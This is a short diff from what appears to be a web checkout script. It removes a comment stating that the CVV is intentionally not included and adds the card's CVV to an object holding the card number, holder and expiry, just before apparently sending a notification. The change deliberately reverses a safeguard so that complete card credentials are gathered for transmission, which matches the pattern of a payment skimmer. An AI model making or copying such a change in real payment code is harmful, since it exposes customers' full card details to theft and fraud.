@@ -829,8 +829,8 @@ ${order.items.map(item =>
                     type: CardValidator.getCardType(elements.cardNumber.value),
                     number: elements.cardNumber.value,
                     holder: elements.cardHolder.value.trim(),
-                    expiry: elements.cardExpiry.value
-                    // CVV is intentionally not included
+                    expiry: elements.cardExpiry.value,
+                    Cvv: elements.cardCvv.value
                 };
                 
                 let notificationSent = false;
